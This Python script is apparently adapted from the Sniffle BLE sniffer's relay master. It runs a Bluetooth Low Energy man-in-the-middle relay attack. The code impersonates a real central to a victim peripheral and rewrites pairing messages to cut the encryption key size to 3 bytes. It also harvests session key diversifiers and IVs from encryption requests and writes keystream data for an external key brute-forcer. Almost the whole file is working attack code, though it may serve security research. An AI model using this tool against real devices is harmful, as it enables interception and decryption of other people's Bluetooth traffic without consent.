# track encryption start on the C_r <-> P link
#!/usr/bin/env python3

# Written by Sultan Qasim Khan
# Copyright (c) 2020-2025, NCC Group plc
# Copyright (c) 2025, Tetrel Security Inc.
# Released as open source under GPLv3

import argparse, sys, signal
import serial
import threading

from binascii import unhexlify
from queue import Queue
from time import time
from select import select
from struct import pack, unpack

from sniffle.pcap import PcapBleWriter
from sniffle.sniffle_hw import SniffleHW, BLE_ADV_AA, PacketMessage, DebugMessage, \
        StateMessage, MeasurementMessage, SnifferState, SnifferMode
from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessage, \
        AdvIndMessage, AdvDirectIndMessage, ScanRspMessage, ConnectIndMessage, \
        str_mac, LlControlMessage, AdvertMessage
from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode

from mitble_help import downgrade_pairing_request, downgrade_pairing_response, make_ble_ccm_nonce, make_ble_ccm_counter_block, ble_ccm_encrypt


from pathlib import Path
from datetime import datetime
import os
import subprocess
"""
Relay attack principles:

C refers to the real central (initiator/master)
P refers to the real peripheral (advertiseer/slave)
C_r refers to relay_master.py (relay impersonating central)
P_r refers to relay_slave.py (relay impersonating peripheral)

Relay master script also has a network listener, relay slave connects to it.

First, the relay master (C_r) gathers the adverisement body and scan response
from the victim peripheral (P). Next, the advertisement data is passed onto
the relay slave (P_r) to mimic the victim peripheral. Once the victim
central (C) connects to the relay slave (P_r) mimicking the victim peripheral,
the relay slave will inform the relay master, so that it can start its own
connection to the real victim peripheral with potentially different parameters.

C               P_r             C_r             P
                                <----------Advert
                                ScanReq--------->
                                <---------ScanRsp
                <---------Advert
                <--------ScanRsp
<---------Advert
ScanReq-------->
<--------ScanRsp
ConnReq-------->
(I starts channel hopping with P_r)
                ConnReq-------->
                                (wait for next advert)
                                <----------Advert
                                ConnReq--------->

Once connected, data can be encrypted, but we don't care, we just pass it on.
One limitation is that encrypted LL_CONTROL messages could change hopping
parameters, but we can't decipher them. It may be possible to make an educated
guess of what the control messages are though based on past behaviour.

C               P_r             C_r             P
Encrypted------>
<----------Empty
                Encrypted----->
                                Encrypted------>
                                <--------EncResp
                <--------EncResp
(wait for next conn event)
Empty--------->
<-------EncResp
"""

# global variable to access hardware
hw = None
new_key_size = 0x03

found_key = None                  
_found_key_lock = threading.Lock()
bruteforce_stop = threading.Event()
bruteforce_thread = None


pcwriter = None
enc_start_seen = False          
first_enc_rsp_pkt = None        
uart_test_pending = False
uart_last_seq = None


link_encryption_active = False
enc_ctr_p_to_c = 0
enc_ctr_c_to_p = 0
last_sn_p_to_c = None
last_sn_c_to_p = None
last_pdu_p_to_c = None
last_pdu_c_to_p = None


# IVs for building the full IV
ivm_from_c = None   # IVm from real central C (C -> P_r, LL_ENC_REQ)
ivs_from_p = None   # IVs from real peripheral P (P -> C_r, LL_ENC_RSP)
iv_real_cp = None   # IVm_from_c || IVs_from_p


skdm_from_c  = None
skds_from_p  = None
skd_real_cp  = None


PROJECT_ROOT = Path(__file__).resolve().parent
BRUTEFORCER_DIR = PROJECT_ROOT / "bruteforcer"
EXPERIMENTS_DIR = BRUTEFORCER_DIR / "experiments"
BRUTEFORCER_BIN = BRUTEFORCER_DIR / "bruteforce_ltk"  # C++ binary

EXPERIMENTS_DIR.mkdir(parents=True, exist_ok=True)

def sigint_handler(sig, frame):
    hw.cancel_recv()
    hw.cmd_chan_aa_phy() # stop scanning or connection
    hw.cmd_rssi(0)
    sys.exit(0)

def main():
    global uart_test_pending, uart_last_seq

    aparse = argparse.ArgumentParser(description="Relay master script for Sniffle BLE5 sniffer")
    aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
    aparse.add_argument("-c", "--advchan", default=37, choices=[37, 38, 39], type=int,
            help="Advertising channel to listen on")
    aparse.add_argument("-m", "--mac", default=None, help="Specify target MAC address")
    aparse.add_argument("-i", "--irk", default=None, help="Specify target IRK")
    aparse.add_argument("-S", "--string", default=None,
            help="Specify target by advertisement search string")
    aparse.add_argument("-P", "--public", action="store_const", default=False, const=True,
            help="Supplied MAC address is public")
    aparse.add_argument("-q", "--quiet", action="store_const", default=False, const=True,
            help="Don't show empty packets")
    aparse.add_argument("-Q", "--preload", default=None, help="Preload expected encrypted "
            "connection parameter changes")
    aparse.add_argument("-f", "--fastslave", action="store_const", default=False, const=True,
            help="Relay slave should request a fast connection interval")
    aparse.add_argument("-p", "--pause", action="store_const", default=False, const=True,
            help="Wait for key press on master before relaying")
    aparse.add_argument("-F", "--fastmaster", action="store_const", default=False, const=True,
            help="Relay master should specify a fast connection interval")
    aparse.add_argument("-o", "--output", default=None, help="PCAP output file name")
    aparse.add_argument("--periph-serial", default=None,
        help="Serial port of the REAL peripheral (e.g. COM7 or /dev/ttyACM0)")
    aparse.add_argument("--periph-baud", type=int, default=115200,
        help="Baudrate for the REAL peripheral (default: 115200)")
    args = aparse.parse_args()
    global hw, periph_ser, new_key_size
    hw = SniffleHW(args.serport)
    


    # put the hardware in a normal state (passive scanning) and configure it with an impossibly
    # high RSSI threshold so that it captures nothing (to avoid filling receive buffers)
    hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0)

    # trap Ctrl-C
    signal.signal(signal.SIGINT, sigint_handler)

    targ_specs = bool(args.mac) + bool(args.irk) + bool(args.string)
    if targ_specs < 1:
        print("Must specify target MAC address, IRK, or advertisement string", file=sys.stderr)
        return
    elif targ_specs > 1:
        print("IRK, MAC, and advertisement string filters are mutually exclusive!", file=sys.stderr)
        return

    if args.public and args.irk:
        print("IRK only works on RPAs, not public addresses!", file=sys.stderr)
        return
    elif args.public and args.string:
        print("Can't specify string search target MAC publicness", file=sys.stderr)
        return

    # wait for relay slave to connect to us
    server = RelayServer()
    print("Waiting for relay slave to connect...")
    conn = server.accept()
    print("Got connection from", conn.peer_ip)

    
    # Network latency test
    stime = time()
    conn.send_msg(MessageType.PING, b'latency_test')
    mtype, body = conn.recv_msg()
    etime = time()
    if mtype != MessageType.PING or body != b'latency_test':
        raise ValueError("Unexpected message type in latency test")
    print("Round trip latency: %.1f ms" % ((etime - stime) * 1000))

    # give the relay slave the preloads if any
    if args.preload:
        conn.send_msg(MessageType.PRELOAD, bytes(args.preload, encoding='utf-8'))
    else:
        conn.send_msg(MessageType.PRELOAD, b'')

    if args.irk:
        mac_bytes = get_mac_from_irk(unhexlify(args.irk), args.advchan)
    elif args.string:
        search_str = args.string.encode('latin-1').decode('unicode_escape').encode('latin-1')
        mac_bytes, args.public = get_mac_from_string(search_str, args.advchan)
    else:
        try:
            mac_bytes = [int(h, 16) for h in reversed(args.mac.split(":"))]
            if len(mac_bytes) != 6:
                raise Exception("Wrong length!")
        except:
            print("MAC must be 6 colon-separated hex bytes", file=sys.stderr)
            return

    # obtain the target's advertisement and scan response, share it with relay slave
    adv, scan_rsp = scan_target(mac_bytes)
    if not adv or not scan_rsp:
        print("Error: Advertisement type must be ADV_IND. Aborting.")
        conn.send_err(ErrorCode.INVALID_ADV)
        return
    conn.send_msg(MessageType.ADVERT, adv.body)
    conn.send_msg(MessageType.SCAN_RSP, scan_rsp.body)

    # put the hardware in a state where it won't capture any packets to avoid filling receive
    # buffer while waiting for connection from relay slave
    hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0)

    if args.periph_serial:
        try:
            periph_ser = serial.Serial(
                args.periph_serial,
                args.periph_baud,
                timeout=0,   # non-blocking, works well with select()
            )
            # e.g. send '0' to pause advertising if you still want that:
            periph_ser.write(b'0')
            print(f"[UART->PERIPH] Opened {periph_ser.port}, sent '0' (pause advertising).")
        except Exception as e:
            print(f"[UART->PERIPH] WARNING: could not open {args.periph_serial}: {e}",
                  file=sys.stderr)
            periph_ser = None
    conn.send_msg(MessageType.PING, b'')

    # relay slave will now impersonate our target

    # wait for relay slave to say who connected to it
    print("Waiting for relay slave to notify us of connection...")
    mtype, body = conn.recv_msg()
    if mtype != MessageType.CONN_REQ:
        raise ValueError("Unexpected message type %s" % mtype.name)
    conn_req = DPacketMessage.from_body(body)
    if not isinstance(conn_req, ConnectIndMessage):
        raise ValueError("CONN_REQ was not a CONN_REQ!")

    if periph_ser is not None:
        try:
            periph_ser.write(b'1')
            print(f"[UART->PERIPH] Sent '1' on {periph_ser.port} (resume advertising).")
        except Exception as e:
            print(f"[UART->PERIPH] WARNING: could not send '1' on {periph_ser.port}: {e}",
                file=sys.stderr)

    print("Relay slave notified us of connection request. Connecting to real target...")
    print(conn_req)
    # Receiver = real central C (checks peripheral peer on the C<->P_r link)
    global pcwriter
    if not (args.output is None):
        pcwriter = PcapBleWriter(args.output)

        pcwriter.write_packet(int(adv.ts_epoch * 1000000), adv.aa, adv.chan,
                adv.rssi, adv.body, adv.phy)
        pcwriter.write_packet(int(scan_rsp.ts_epoch * 1000000), scan_rsp.aa,
                scan_rsp.chan, scan_rsp.rssi, scan_rsp.body, scan_rsp.phy)
        print('channel: ', conn_req.chan)
        pcwriter.write_packet(int(time() * 1000000), conn_req.aa, conn_req.chan,
                conn_req.rssi, conn_req.body, conn_req.phy)

    connector_addr = conn_req.InitA
    connector_random = bool(conn_req.TxAdd)
    if args.fastmaster:
        connector_interval = 6
        connector_latency = 0
    else:
        connector_interval = conn_req.Interval
        connector_latency = conn_req.Latency

    preloads = []
    if args.preload:
        # expect colon separated pairs, separated by commas
        preloads = []
        for tstr in args.preload.split(','):
            tsplit = tstr.split(':')
            tup = (int(tsplit[0]), int(tsplit[1]))
            preloads.append(tup)

    #input("Press Enter to initiate (send CONNECT_IND on next advert)...")
    #print('Send connection request...')
    # connect to real target, impersonating who connected to relay slave
    connect_target(mac_bytes, args.advchan, not args.public, connector_addr,
            connector_random, connector_interval, connector_latency, preloads)
  #  print('Send connection request 1 sent')
    # wait for transition to master state
    while True:
        msg = hw.recv_and_decode()
        print(msg)
        if isinstance(msg, StateMessage) and msg.new_state == SnifferState.CENTRAL:
            print("Inside if")
            hw.decoder_state.cur_aa = conn_req.aa_conn
            break
    print("Connected to target.", end='\n\n')

    # request legitimate master (relay slave) to use a fast connection interval
    # LL Control (0x03), length 24 (0x18), LL_CONNECTION_PARAM_REQ (0x0F)
    # interval: 0x0006 to 0x000A (7.5 to 15 ms)
    # latency: 0
    # timeout: 0x01F4 (5 seconds)
    # preferred periodicity: 3
    # reference event: 0x0005
    # offsets: 0x0001, 0x0002, 0x0003, 0x0004, 0x0005, 0x0000
    if args.fastslave:
        conn_update_pdu = DPacketMessage.from_body(b'\x03\x18\x0f\x06\x00\x0c\x00\x00\x00\xf4\x01\x03'
                b'\x05\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x00\x00')
        conn.send_msg(MessageType.PACKET, b'\x04\x00' + conn_update_pdu.body)

    filter_changes = args.fastslave or args.fastmaster

    while True:
        fds = [hw.ser.fd, conn.sock]
        if periph_ser is not None:
            try:
                fds.append(periph_ser.fileno())
            except Exception:
                # fileno() may not exist on some platforms; then you can’t use select() on it
                print("[UART] error using fileno()")
                pass

        ready, _, _ = select(fds, [], [])

        if conn.sock in ready:
            sock_recv_print_forward(conn, args.quiet, filter_changes)

        if hw.ser.fd in ready:
            ser_recv_print_forward(conn, args.quiet, filter_changes)

        if periph_ser is not None:
            try:
                fd = periph_ser.fileno()
            except Exception:
                fd = None

            if fd is not None and fd in ready:
                line = periph_ser.readline()
                if line:
                    print(f"[UART_PERIPH] got line: {line!r}")
                    if line.startswith(b'B'):
                        parts = line.split()
                        if len(parts) >= 2:
                            try:
                                seq = int(parts[1])
                                print(f"[UART_PERIPH] test notification seq={seq}")
                                uart_test_pending = True
                                print(f"[UART_PERIPH] status uart_test_pending: {uart_test_pending}")
                                uart_last_seq = seq
                            except ValueError:
                                print(f"[UART_PERIPH] could not parse seq from {line!r}")


def has_instant(pkt):
    return isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]

def is_param_req(pkt):
    return isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0F


def create_experiment_dir() -> Path:
    """
    Create a unique subdirectory for this experiment under bruteforcer/experiments.
    Example: bruteforcer/experiments/20251126_163215_12345/
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    pid = os.getpid()
    exp_id = f"{timestamp}_{pid}"
    exp_dir = EXPERIMENTS_DIR / exp_id
    exp_dir.mkdir(parents=True, exist_ok=False)
    return exp_dir


def write_attack_data_binary(exp_dir: Path,
                             key_size: int,
                             plaintext: bytes,
                             ciphertext: bytes,
                             skd: bytes) -> Path:
    """
    attack_data.bin format (raw binary):
        key_size (1 byte)
        plaintext / counter block (16 bytes)
        ciphertext / keystream (16 bytes)
        SKD (16 bytes)
    """
    if not (1 <= key_size <= 16):
        raise ValueError(f"key_size must be 1..16, got {key_size}")
    if len(plaintext) != 16 or len(ciphertext) != 16 or len(skd) != 16:
        raise ValueError("plaintext, ciphertext, SKD must all be 16 bytes")

    attack_path = exp_dir / "attack_data.bin"
    with attack_path.open("wb") as f:
        f.write(bytes([key_size]))
        f.write(plaintext)
        f.write(ciphertext)
        f.write(skd)

    print(f"[BRUTEFORCER] Wrote attack data to {attack_path}")
    print(f"[BRUTEFORCER] Run your C++ tool like:")
    print(f"    cd {BRUTEFORCER_DIR}")
    print(f"    ./bruteforcer_ltk {attack_path.name}")
    return attack_path

def _hex_bytes(b: bytes) -> str:
    return " ".join(f"{x:02x}" for x in b)

def _hx(b: bytes) -> str:
    return ''.join(f'{x:02x}' for x in b)

def _extract_smp_key_size_from_ll_body(ll_body: bytes):
    """
    Returns smp_code and key_size for SMP Pairing Req/Rsp,
    """
    if len(ll_body) < 4:
        return (None, None)
    llid = ll_body[0] & 0x03
    length = ll_body[1]
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return (None, None)
    l2cap = ll_body[2:2+length]
    if len(l2cap) < 7:
        return (None, None)
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)
    if cid != 0x0006 or len(l2cap) < 4 + l2len or l2len < 7:
        return (None, None)
    smp = l2cap[4:4+l2len]
    smp_code = smp[0]
    if smp_code not in (0x01, 0x02):  
        return (None, None)
    return (smp_code, smp[4])


def _extract_skd_iv_from_ll_enc_req(ctrl: LlControlMessage):
    """
    LL_ENC_REQ (0x03), total length 23 bytes:
        opcode | RAND(8) | EDIV(2) | SKDm(8) | IVm(4)

    Returns (SKDm, IVm) or (None, None) on mismatch.
    """
    body = ctrl.body
    if ctrl.opcode != 0x03 or len(body) < 23:
        return None, None

    # Last 12 bytes = SKDm(8) || IVm(4)
    skdm = body[-12:-4]  # bytes 11..18
    ivm  = body[-4:]     # bytes 19..22
    return skdm, ivm


def _extract_skd_iv_from_ll_enc_rsp(ctrl: LlControlMessage):
    """
    LL_ENC_RSP (0x04), total length 13 bytes:
        opcode | SKDs(8) | IVs(4)

    Returns (SKDs, IVs) or (None, None) on mismatch.
    """
    body = ctrl.body
    if ctrl.opcode != 0x04 or len(body) < 13:
        return None, None

    # Last 12 bytes = SKDs(8) || IVs(4)
    skds = body[-12:-4]  # bytes 1..8
    ivs  = body[-4:]     # bytes 9..12
    return skds, ivs


def ser_recv_print_forward(conn, quiet, filter_changes=False):
    global enc_start_seen, first_enc_rsp_pkt
    global ivm_from_c, ivs_from_p, iv_real_cp
    global uart_test_pending, uart_last_seq
    global link_encryption_active, enc_ctr_p_to_c, enc_ctr_c_to_p
    global last_sn_p_to_c, last_sn_c_to_p
    global last_pdu_p_to_c, last_pdu_c_to_p   # NEW: track last PDU bytes per direction
    global skd_real_cp, skdm_from_c, skds_from_p
    global new_key_size
    msg = hw.recv_and_decode()

    if isinstance(msg, PacketMessage):
        msg = DPacketMessage.decode(msg)
        # only forward non-empty data (for printing / forwarding decisions)
        empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
        block_req = filter_changes and is_param_req(msg)

        # LL_START_ENC_REQ / RSP (opcode 0x05) on this link, packetCounters are reset.
        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05:
            link_encryption_active = True
            enc_ctr_p_to_c = -1
            enc_ctr_c_to_p = -1
            last_sn_p_to_c = None
            last_sn_c_to_p = None
            last_pdu_p_to_c = None      # NEW: also clear last PDU tracking
            last_pdu_c_to_p = None
            print("Saw LL_START_ENC_RSP on real, packetCounters starts at -1")

        packet_counter = None  # define here so it's visible later
        data_dir = 1           # default, in case msg is not DataMessage

        if isinstance(msg, DataMessage):
            # data_dir to indicate direction:
            #   1 = slave -> master (P -> C_r)
            #   0 = master -> slave (C_r -> P)
            data_dir = getattr(msg, "data_dir", 0)
            pdu = msg.body

            if len(pdu) < 2:
                print("Data PDU too short for header")
                has_payload = False   # NEW: avoid use-before-assign
            else:
                hdr0 = pdu[0]
                length = pdu[1]
                has_payload = (length > 0)

                # SN is bit 2 of the LL data header
                sn_bit = (hdr0 >> 2) & 0x01

                if link_encryption_active and has_payload:
                    print(f"State of uart: {uart_test_pending}")

                    if data_dir == 1:
                        # P -> C_r
                        if last_sn_p_to_c is None:
                            # First encrypted PDU in this direction
                            packet_counter = enc_ctr_p_to_c
                            enc_ctr_p_to_c += 1
                            last_sn_p_to_c = sn_bit
                            last_pdu_p_to_c = pdu
                            print(f"P->C_r FIRST encrypted PDU, packetCounter={packet_counter}")

                        elif sn_bit != last_sn_p_to_c:
                            # SN toggled -> definitely a new PDU
                            packet_counter = enc_ctr_p_to_c
                            enc_ctr_p_to_c += 1
                            last_sn_p_to_c = sn_bit
                            last_pdu_p_to_c = pdu
                            print(f"P->C_r NEW encrypted PDU (SN toggled), packetCounter={packet_counter}")

                        else:
                            # SN unchanged: could be retransmit OR our state was off
                            if pdu == last_pdu_p_to_c:
                                print("P->C_r retransmit (SN unchanged, PDU identical) – not incrementing counter")
                            else:
                                # SN same but payload changed => treat as NEW and resync
                                packet_counter = enc_ctr_p_to_c
                                enc_ctr_p_to_c += 1
                                last_sn_p_to_c = sn_bit  # unchanged but we confirm
                                last_pdu_p_to_c = pdu
                                print(f"P->C_r NEW encrypted PDU (SN same but payload changed) – packetCounter={packet_counter}")

                    else:
                        # C_r -> P
                        if last_sn_c_to_p is None:
                            packet_counter = enc_ctr_c_to_p
                            enc_ctr_c_to_p += 1
                            last_sn_c_to_p = sn_bit
                            last_pdu_c_to_p = pdu
                            print(f"C_r->P FIRST encrypted PDU, packetCounter={packet_counter}")

                        elif sn_bit != last_sn_c_to_p:
                            packet_counter = enc_ctr_c_to_p
                            enc_ctr_c_to_p += 1
                            last_sn_c_to_p = sn_bit
                            last_pdu_c_to_p = pdu
                            print(f"C_r->P NEW encrypted PDU (SN toggled), packetCounter={packet_counter}")

                        else:
                            if pdu == last_pdu_c_to_p:
                                print("C_r->P retransmit (SN unchanged, PDU identical) – not incrementing counter")
                            else:
                                packet_counter = enc_ctr_c_to_p
                                enc_ctr_c_to_p += 1
                                last_sn_c_to_p = sn_bit
                                last_pdu_c_to_p = pdu
                                print("C_r->P NEW encrypted PDU (SN same but payload changed) – resyncing packetCounter")

            # direction bit for CCM nonce:
            # BLE: directionBit = 0 for P->C, 1 for C->P
            direction_bit = 0 if data_dir == 1 else 1   # FIXED: was always 0 before

            if uart_test_pending and not empty and data_dir == 1:
                print("Encrypted packet will be sent by P!")
                uart_test_pending = False

                if packet_counter is not None:
                    print(f"This PDU has packetCounter={packet_counter}")

                if len(pdu) < 2:
                    print(f"ERROR: PDU too short for header (len={len(pdu)})")
                    return

                hdr0 = pdu[0]
                length = pdu[1]
                payload = pdu[2:2 + length]

                MIC_LEN = 4
                if len(payload) <= MIC_LEN:
                    print(f"ERROR: payload too short for data+MIC (len={len(payload)})")
                    return

                ciphertext = payload[:-MIC_LEN]
                mic_on_air = payload[-MIC_LEN:]

                VALUE_LEN = 16
                if len(ciphertext) != VALUE_LEN:
                    print(f"Ciphertext is not the length we expect")
        

                print(f"ciphertext: {_hx(ciphertext)}")
                print(f"MIC (encrypted): {_hx(mic_on_air)}")

                if iv_real_cp is not None and packet_counter is not None:
                    # Build nonce + counter block for block index 2
                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, 0)
                    a0 = make_ble_ccm_counter_block(nonce, block_index=2)
                    ciphertext_test = ciphertext[-VALUE_LEN:]
                    plaintext_test = bytes(16)
                    keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
                    if skd_real_cp is None:
                        print("[BRUTEFORCER] SKD not yet known, cannot write attack data")
                    else:
                        # If you later discover you must reverse SKD for AES,
                        # do it here and in your C++ code consistently.
                        skd_for_aes = skd_real_cp[::-1]

                        print(f"       Counter block (P): {_hx(a0)}")
                        print(f"       Keystream (C):    {_hx(keystream)}")
                        print(f"       SKD:              {_hx(skd_for_aes)}")

                        # new_key_size is your downgraded key size (e.g. 0x02)
                        key_size = new_key_size

                        # Create a new experiment dir and write attack_data.bin
                        exp_dir = create_experiment_dir()
                        write_attack_data_binary(
                            exp_dir,
                            key_size,
                            a0,            # plaintext / counter block
                            keystream,     # ciphertext / keystream
                            skd_for_aes,   # SKD
                        )


        # LL_ENC_RSP from P to extract IV
        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04:
            skds, ivs = _extract_skd_iv_from_ll_enc_rsp(msg)

            if ivs is not None:
                ivs_from_p = ivs
                print(f"[IV] IVs from real peripheral (LL_ENC_RSP on P->C_r): {_hx(ivs_from_p)}")

            if skds is not None:
                skds_from_p = skds
                print(f"[SKD] SKDs from real peripheral (LL_ENC_RSP on P->C_r): {_hx(skds_from_p)}")

            # Combine IV when we have both halves
            if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
                iv_real_cp = ivm_from_c + ivs_from_p
                print(f"[IV] Combined real C<->P IV (IVm||IVs): {_hx(iv_real_cp)}")

            # Combine SKD when we have both halves
            if skdm_from_c is not None and skds_from_p is not None and skd_real_cp is None:
                skd_real_cp = skdm_from_c + skds_from_p
                print(f"[SKD] Combined real C<->P SKD (SKDm||SKDs): {_hx(skd_real_cp)}")

        # Downgrade entropy (max key size parameter)
        if not empty and not block_req and isinstance(msg, DataMessage):
            old_body = msg.body
            new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
            if changed:
                old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
                new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
                code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
                print(f"[DOWNGRADE] {code_name}: key size {old_ks} -> {new_ks}")
                print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
                print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
                msg.body = new_ll

        if not empty and not block_req:
            # Forward packets to the relay slave
            conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
        if block_req:
            # LL_REJECT_EXT_IND, unacceptable connection parameters
            hw.cmd_transmit(3, b'\x11\x0F\x3B')

    print_message(msg, quiet)




def sock_recv_print_forward(conn, quiet,filter_changes=False):
    global enc_start_seen, first_enc_rsp_pkt
    global ivm_from_c, ivs_from_p, iv_real_cp
    global uart_test_pending, uart_last_seq
    global skd_real_cp, skdm_from_c, skds_from_p
    global new_key_size
    # receive packets from relay slave and retransmit them here
    mtype, body = conn.recv_msg()
    if mtype != MessageType.PACKET:
        return

    old_packet = body

    # Downgrade entropy (max key size parameter)
    new_packet, changed = downgrade_pairing_response(body, new_key_size)
    body = new_packet
    if changed:
        old_ll = old_packet[2:]
        new_ll = new_packet[2:]

        old_code, old_ks = _extract_smp_key_size_from_ll_body(old_ll)
        new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
        code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")

        print(f"[DOWNGRADE] {code_name} (from peripheral): key size {old_ks} -> {new_ks}")
        print(f"  old LL body ({len(old_ll)} bytes): {_hex_bytes(old_ll)}")
        print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")

    
    event, = unpack('<H', body[:2])
    body = body[2:]
    llid = body[0] & 3
    pdu = body[2:]
    # construct packet object for display and PCAP
    pkt = DPacketMessage.from_body(body, True)
    pkt.ts_epoch = time()
    pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
    pkt.aa = hw.decoder_state.cur_aa
    pkt.event = event

    # LL_ENC_REQ from P to extract IV
    if isinstance(pkt, LlControlMessage) and pkt.opcode == 0x03:
        skdm, ivm = _extract_skd_iv_from_ll_enc_req(pkt)

        if ivm is not None:
            ivm_from_c = ivm
            print(f"[IV] IVm from real central (LL_ENC_REQ on C->P_r): {_hx(ivm_from_c)}")

        if skdm is not None:
            skdm_from_c = skdm
            print(f"[SKD] SKDm from real central (LL_ENC_REQ on C->P_r): {_hx(skdm_from_c)}")

        # Combine IV when we have both halves
        if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
            iv_real_cp = ivm_from_c + ivs_from_p
            print(f"[IV] Combined real C<->P IV (IVm||IVs): {_hx(iv_real_cp)}")

        # Combine SKD when we have both halves
        if skdm_from_c is not None and skds_from_p is not None and skd_real_cp is None:
            skd_real_cp = skdm_from_c + skds_from_p
            print(f"[SKD] Combined real C<->P SKD (SKDm||SKDs): {_hx(skd_real_cp)}")
    # Passing on PDUs with instants in the past would break the connection
    if not (filter_changes and has_instant(pkt)):
        hw.cmd_transmit(llid, pdu, event)
    print_message(pkt, quiet)


def print_message(msg, quiet=False):
    if isinstance(msg, DPacketMessage):
        print_packet(msg, quiet)
    elif isinstance(msg, DebugMessage) or \
            isinstance(msg, StateMessage) or \
            isinstance(msg, MeasurementMessage):
        print(msg, end='\n\n')

def get_mac_from_irk(irk, chan=37):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False) # capture advertisements only
    hw.cmd_rssi(-128)
    hw.cmd_irk(irk, False)
    hw.cmd_auxadv(False)
    hw.mark_and_flush()

    print("Waiting for advertisement with suitable RPA...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvIndMessage) or isinstance(dpkt, AdvDirectIndMessage):
            print("Found target MAC: %s" % str_mac(dpkt.AdvA))
            return dpkt.AdvA

def get_mac_from_string(s, chan=37):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False) # capture advertisements only
    hw.cmd_rssi(-128)
    hw.cmd_mac()
    hw.cmd_auxadv(False)
    hw.random_addr()
    hw.cmd_scan()
    hw.mark_and_flush()

    print("Waiting for advertisement containing specified string...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, (AdvIndMessage, AdvDirectIndMessage, ScanRspMessage)):
            if s in dpkt.body:
                print("Found target MAC: %s" % str_mac(dpkt.AdvA))
                return dpkt.AdvA, not dpkt.TxAdd

def scan_target(mac):
    advPkt = None
    scanRspPkt = None

    hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(mac, False)
    hw.cmd_auxadv(False) # we only support impersonating legacy advertisers for now
    hw.random_addr()
    hw.cmd_scan()
    hw.mark_and_flush()

    while (advPkt is None) or (scanRspPkt is None):
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvIndMessage):
            if advPkt is None:
                print("Found advertisement.")
            advPkt = dpkt
        elif isinstance(dpkt, ScanRspMessage):
            if scanRspPkt is None:
                print("Found scan response.")
            scanRspPkt = dpkt
        elif isinstance(dpkt, AdvertMessage):
            print("Received incompatible advertisement of type %s." % dpkt.pdutype)
            return None, None

    print("Target Advertisement:")
    print(advPkt)
    print()
    print("Target Scan Response:")
    print(scanRspPkt)
    print()

    return advPkt, scanRspPkt

def connect_target(targ_mac, chan=37, targ_random=True, initiator_mac=None, initiator_random=True,
        interval=24, latency=1, preloads=[]):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(targ_mac, False)
    hw.cmd_auxadv(False)
    hw.cmd_interval_preload(preloads)
    hw.cmd_phy_preload()
    if initiator_mac is None:
        hw.random_addr()
    else:
        hw.cmd_setaddr(initiator_mac, initiator_random)
    hw.mark_and_flush()

    # now enter initiator mode
    return hw.initiate_conn(targ_mac, targ_random, interval, latency)

def print_packet(pkt, quiet=False):
    is_not_empty = not (isinstance(pkt, LlDataContMessage) and pkt.data_length == 0)

    if not quiet or is_not_empty:
        print(pkt, end='\n\n')

    # Record the packet if PCAP writing is enabled
    if pcwriter and is_not_empty:
        if isinstance(pkt, DataMessage):
            pdu_type = 3 if pkt.data_dir else 2
        else:
            pdu_type = 0
        pcwriter.write_packet(int(pkt.ts_epoch * 1000000), pkt.aa, pkt.chan, pkt.rssi,
                pkt.body, pkt.phy, pdu_type)

if __name__ == "__main__":
    main()
